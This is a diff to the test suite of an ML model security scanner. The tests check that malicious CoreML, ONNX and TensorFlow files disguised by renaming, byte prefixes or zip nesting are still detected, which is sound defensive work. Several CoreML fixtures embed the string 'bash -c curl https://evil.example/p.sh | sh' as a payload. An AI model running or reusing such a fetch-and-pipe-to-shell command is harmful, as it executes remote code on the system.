@@ -10,7 +10,7 @@ import pickle
 import struct
 import sys
 import zipfile
-from collections.abc import Iterator
+from collections.abc import Callable, Iterator
 from contextlib import contextmanager
 from pathlib import Path
 from typing import Any, cast
@@ -32,13 +32,14 @@ from modelaudit.utils.file.detection import (
     JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES,
     LLAMAFILE_ROUTE_SCAN_BYTES,
     LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
-    ONNX_ROUTING_INCONCLUSIVE_FORMAT,
+    PROTOBUF_MODEL_CANDIDATE_FORMAT,
     SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
     TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT,
 )
 from modelaudit.utils.helpers.secure_hasher import SecureFileHasher, compute_aggregate_hash
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
 from tests.helpers import (
+    create_mock_coreml,
     create_mock_gguf,
     create_mock_mxnet_symbol,
     create_mock_onnx,
@@ -4991,6 +4992,49 @@ def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
     )
 
 
+@pytest.mark.parametrize("prefix", [b"", b"\x9a\x06\x03pad", b"\x9b\x06\x08\x01\x9c\x06"])
+def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Path, prefix: bytes) -> None:
+    disguised_coreml = create_mock_coreml(
+        tmp_path / "malicious.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())
+
+    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "coreml"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
+        for issue in result.issues
+    )
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        b"\x08\x08" + (b"\x9a\x06\x00" * 4097),
+        b"\x08\x08" + b"\x9b\x06" + (b"\x08\x01" * 4097) + b"\x9c\x06",
+    ],
+    ids=["top-level-field-budget", "unknown-group-budget"],
+)
+def test_scan_file_detects_malicious_budget_exhausted_renamed_coreml(tmp_path: Path, prefix: bytes) -> None:
+    disguised_coreml = create_mock_coreml(
+        tmp_path / "budgeted.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())
+
+    result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "coreml"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
+        for issue in result.issues
+    )
+
+
 def test_scan_file_detects_malicious_prefixed_renamed_onnx_by_content(tmp_path: Path) -> None:
     pytest.importorskip("onnx")
     disguised_onnx = create_mock_onnx(tmp_path / "malicious.jpg", op_type="PythonOp")
@@ -5006,15 +5050,41 @@ def test_scan_file_detects_malicious_prefixed_renamed_onnx_by_content(tmp_path: 
     )
 
 
-def test_scan_file_detects_malicious_budget_prefixed_declared_onnx(tmp_path: Path) -> None:
-    pytest.importorskip("onnx")
-    declared_onnx = create_mock_onnx(tmp_path / "malicious.onnx", op_type="PythonOp")
-    prefix_mock_onnx_with_unknown_field(declared_onnx, value_size=0, count=4097, field_number=2)
+@pytest.mark.parametrize(
+    "prefix",
+    [b"\x9a\x06\x03pad", b"\x9b\x06\x08\x01\x9c\x06", b"\x08\x08" + (b"\x9a\x06\x00" * 4097)],
+    ids=["unknown-field", "unknown-group", "field-budget-candidate"],
+)
+def test_scan_file_routes_prefixed_misnamed_coreml_nested_in_zip(tmp_path: Path, prefix: bytes) -> None:
+    nested_coreml = create_mock_coreml(
+        tmp_path / "nested.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    nested_coreml.write_bytes(prefix + nested_coreml.read_bytes())
+    archive_path = tmp_path / "bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.write(nested_coreml, arcname="models/nested.jpg")
 
-    result = scan_file(str(declared_onnx), config={"cache_scan_results": False})
-    aggregate = scan_model_directory_or_file(str(declared_onnx), cache_scan_results=False)
+    result = scan_file(str(archive_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "zip"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
+        for issue in result.issues
+    )
+
+
+def test_scan_file_detects_malicious_budget_exhausted_prefixed_renamed_onnx(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
+    disguised_onnx = create_mock_onnx(tmp_path / "many-prefixes.jpg", op_type="PythonOp")
+    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=0, count=4097, field_number=8)
+
+    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
+    aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)
 
     assert result.scanner_name == "onnx"
+    assert result.success is False
     assert any(
         issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
         for issue in result.issues
@@ -5022,28 +5092,28 @@ def test_scan_file_detects_malicious_budget_prefixed_declared_onnx(tmp_path: Pat
     assert core_module.determine_exit_code(aggregate) == 1
 
 
-@pytest.mark.parametrize("field_number", [2, 9])
-def test_scan_file_fails_closed_on_budget_exhausted_prefixed_renamed_onnx(
+@pytest.mark.parametrize("suffix", [".pb", ".bin"])
+def test_scan_file_detects_malicious_budget_exhausted_onnx_with_competing_suffix(
     tmp_path: Path,
-    field_number: int,
+    suffix: str,
 ) -> None:
     pytest.importorskip("onnx")
-    disguised_onnx = create_mock_onnx(tmp_path / "many-prefixes.jpg", op_type="PythonOp")
-    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=0, count=4097, field_number=field_number)
+    disguised_onnx = create_mock_onnx(tmp_path / f"many-prefixes{suffix}", op_type="PythonOp")
+    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=0, count=4097, field_number=8)
 
     result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
     aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)
 
-    assert result.scanner_name == "unknown"
+    assert result.scanner_name == "onnx"
     assert result.success is False
-    assert result.metadata["scan_outcome"] == "inconclusive"
-    assert result.metadata["operational_error_reason"] == "onnx_routing_incomplete"
-    assert any(issue.details.get("format") == ONNX_ROUTING_INCONCLUSIVE_FORMAT for issue in result.issues)
-    assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
-    assert core_module.determine_exit_code(aggregate) == 2
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
+        for issue in result.issues
+    )
+    assert core_module.determine_exit_code(aggregate) == 1
 
 
-def test_scan_file_fails_closed_on_budget_exhausted_group_prefixed_renamed_onnx(tmp_path: Path) -> None:
+def test_scan_file_detects_malicious_budget_exhausted_group_prefixed_renamed_onnx(tmp_path: Path) -> None:
     pytest.importorskip("onnx")
     disguised_onnx = create_mock_onnx(tmp_path / "group-many-prefixes.jpg", op_type="PythonOp")
     prefix_mock_onnx_with_unknown_group(disguised_onnx)
@@ -5051,12 +5121,13 @@ def test_scan_file_fails_closed_on_budget_exhausted_group_prefixed_renamed_onnx(
     result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
     aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)
 
-    assert result.scanner_name == "unknown"
+    assert result.scanner_name == "onnx"
     assert result.success is False
-    assert result.metadata["operational_error_reason"] == "onnx_routing_incomplete"
-    assert any(issue.details.get("format") == ONNX_ROUTING_INCONCLUSIVE_FORMAT for issue in result.issues)
-    assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
-    assert core_module.determine_exit_code(aggregate) == 2
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
+        for issue in result.issues
+    )
+    assert core_module.determine_exit_code(aggregate) == 1
 
 
 def test_scan_file_fails_closed_on_budget_exhausted_onnx_flax_overlap(tmp_path: Path) -> None:
@@ -5077,7 +5148,7 @@ def test_scan_file_fails_closed_on_budget_exhausted_onnx_flax_overlap(tmp_path: 
 def test_scan_file_fails_closed_on_budget_exhausted_renamed_onnx_without_structure(tmp_path: Path) -> None:
     pytest.importorskip("onnx")
     ambiguous_onnx = tmp_path / "ambiguous.jpg"
-    ambiguous_onnx.write_bytes((b"\x4a\x00" * 4097) + b"\x00malformed-tail")
+    ambiguous_onnx.write_bytes(b"\x4a\x00" * 4097)
     cache_dir = tmp_path / "cache"
     config = {
         "cache_enabled": True,
@@ -5091,19 +5162,16 @@ def test_scan_file_fails_closed_on_budget_exhausted_renamed_onnx_without_structu
         repeated_result = scan_file(str(ambiguous_onnx), config=config)
 
         assert result.scanner_name == "unknown"
-        assert result.success is False
-        assert repeated_result.success is False
-        assert result.metadata["scan_outcome"] == "inconclusive"
-        assert "onnx_routing_incomplete" in result.metadata["scan_outcome_reasons"]
-        assert result.metadata["operational_error_reason"] == "onnx_routing_incomplete"
-        check = next(check for check in result.checks if check.name == "ONNX Routing")
-        assert check.details["format"] == ONNX_ROUTING_INCONCLUSIVE_FORMAT
-        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+        assert result.success is True
+        assert repeated_result.success is True
+        assert result.issues == []
+        assert result.metadata["tentative_protobuf_candidate_rejected"] is True
+        assert "scan_outcome" not in result.metadata
     finally:
         reset_cache_manager()
 
     aggregate = scan_model_directory_or_file(str(ambiguous_onnx), cache_scan_results=False)
-    assert core_module.determine_exit_code(aggregate) == 2
+    assert core_module.determine_exit_code(aggregate) == 0
 
 
 def test_scan_file_detects_malicious_renamed_tf_metagraph_by_content(tmp_path: Path) -> None:
@@ -5120,6 +5188,45 @@ def test_scan_file_detects_malicious_renamed_tf_metagraph_by_content(tmp_path: P
         and issue.details.get("op_type") == "PyFunc"
         for issue in result.issues
     )
+
+
+@pytest.mark.parametrize(
+    ("filename", "payload_factory", "expected_scanner", "expected_message"),
+    [
+        (
+            "saved.json",
+            _build_malicious_tf_savedmodel,
+            "tf_savedmodel",
+            "PyFunc operation detected",
+        ),
+        (
+            "metagraph.json",
+            _build_malicious_tf_metagraph,
+            "tf_metagraph",
+            "Dangerous TensorFlow operation: PyFunc",
+        ),
+    ],
+)
+def test_scan_file_detects_malicious_tensorflow_protobuf_renamed_json(
+    tmp_path: Path,
+    filename: str,
+    payload_factory: Callable[[], bytes],
+    expected_scanner: str,
+    expected_message: str,
+) -> None:
+    disguised_tensorflow = tmp_path / filename
+    disguised_tensorflow.write_bytes(payload_factory())
+
+    result = scan_file(str(disguised_tensorflow), config={"cache_scan_results": False})
+
+    assert result.scanner_name == expected_scanner
+    assert result.success is False
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and expected_message in issue.message for issue in result.issues
+    )
+
+    aggregate = scan_model_directory_or_file(str(disguised_tensorflow), cache_scan_results=False)
+    assert core_module.determine_exit_code(aggregate) == 1
 
 
 def test_scan_file_detects_malicious_renamed_tf_function_metagraph_by_content(tmp_path: Path) -> None:
@@ -5323,6 +5430,38 @@ def test_scan_file_routes_oversized_renamed_tf_metagraph_to_fail_closed_scan(tmp
     assert core_module.determine_exit_code(aggregate) == 2
 
 
+@pytest.mark.parametrize("suffix", [".jpg", ".pb"])
+def test_scan_file_fails_closed_on_unparseable_tentative_onnx_candidate(tmp_path: Path, suffix: str) -> None:
+    pytest.importorskip("onnx")
+    malformed_payload = tmp_path / f"malformed-large{suffix}"
+    malformed_payload.write_bytes((b"\x42\x00" * 4097) + b"\x08")
+    cache_dir = tmp_path / "cache"
+    config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+
+    reset_cache_manager()
+    try:
+        result = scan_file(str(malformed_payload), config=config)
+        repeated_result = scan_file(str(malformed_payload), config=config)
+
+        assert result.scanner_name == "unknown"
+        assert result.success is False
+        assert repeated_result.success is False
+        assert result.bytes_scanned == malformed_payload.stat().st_size
+        assert result.metadata["scan_outcome"] == "inconclusive"
+        assert "onnx_tentative_candidate_parse_incomplete" in result.metadata["scan_outcome_reasons"]
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+    aggregate = scan_model_directory_or_file(str(malformed_payload), cache_scan_results=False)
+    assert aggregate.success is False
+    assert core_module.determine_exit_code(aggregate) == 2
+
+
 def test_scan_file_does_not_route_oversized_malformed_tf_protobuf_near_match(tmp_path: Path) -> None:
     malformed_payload = tmp_path / "malformed-large.jpg"
     malformed_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * 1024))
@@ -5444,6 +5583,61 @@ def test_scan_file_unavailable_recognized_format_result_is_not_cached(
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
     finally:
         reset_cache_manager()
+
+
+def test_scan_file_unavailable_protobuf_candidate_analyzer_fails_closed_and_is_not_cached(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    candidate = tmp_path / "candidate.jpg"
+    candidate.write_bytes(b"bounded-probe candidate")
+    cache_dir = tmp_path / "cache"
+    config = {
+        "cache_enabled": True,
+        "cache_dir": str(cache_dir),
+        "min_cache_file_size": 0,
+    }
+
+    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: PROTOBUF_MODEL_CANDIDATE_FORMAT)
+    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: PROTOBUF_MODEL_CANDIDATE_FORMAT)
+    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
+    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)
+
+    reset_cache_manager()
+    try:
+        first = scan_file(str(candidate), config=config)
+        second = scan_file(str(candidate), config=config)
+
+        assert first.success is False
+        assert second.success is False
+        assert first.metadata["operational_error_reason"] == "protobuf_model_routing_incomplete"
+        assert first.metadata["scan_outcome"] == "inconclusive"
+        check = next(check for check in first.checks if check.name == "Protobuf Model Routing")
+        assert "tentative protobuf analysis was unavailable" in check.message
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_scan_file_keeps_budget_exhausted_coreml_candidate_owned_by_extension(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    coreml_candidate = tmp_path / "model.mlmodel"
+    coreml_candidate.write_bytes(b"\x42\x00" * 4097)
+
+    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
+    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)
+
+    result = scan_file(str(coreml_candidate))
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
+    check = next(check for check in result.checks if check.name == "Format Detection")
+    assert check.details["format"] == "coreml"
+    assert check.details["preferred_scanner_id"] == "coreml"
+    assert not any(check.name == "Protobuf Model Routing" for check in result.checks)
 
 
 def test_scan_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp_path: Path) -> None:
